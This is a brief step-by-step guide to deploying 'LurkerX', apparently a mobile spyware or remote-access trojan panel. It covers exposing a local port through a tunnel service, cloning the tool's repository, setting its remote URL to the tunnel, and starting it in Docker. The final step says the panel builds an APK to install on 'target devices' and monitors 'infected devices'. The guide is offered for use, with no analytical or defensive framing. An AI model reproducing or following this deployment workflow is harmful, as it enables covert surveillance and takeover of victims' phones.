# How to install LurkerX v1.7.3 using Docker, August 2026

This guide is a bit technical. It assumes you have basic knowledge in using the CLI and Docker.

1. You need to start a tunnel(This would be the remote URL the app connect to)

**TUNNEL OPTIONS: [Localtonet.com](https://localtonet.com)
Start the tunnel to target port 5000, that's the port this project uses by default. 

2. Clone the public repo using `git`: [the-hollowclan/LurkerX](https://github.com/the-hollowclan/LurkerX)

```bash
git clone https://github.com/the-hollowclan/LurkerX
```

3. Run the next command to open the project:

```bash
cd LurkerX
```

4. Edit the `choices.ini`, especially the `remoteUrl` option in the `choices.ini` configuration file. Replace it with your Tunnel's URL. 

**Also set the `public_repo` to `none`**

5. Now ensure you have docker installed and run the command below to build and start the container:

```bash
make build && make up
```

6. Ensure the tunnel has started too, then open your Tunnel's URL or `http://localhost:5000` to launch the LurkerX dashboard. 

7. From there you can unlock the panel, build the APK and download/install it onto target devices, and also monitor live information on infected devices. 
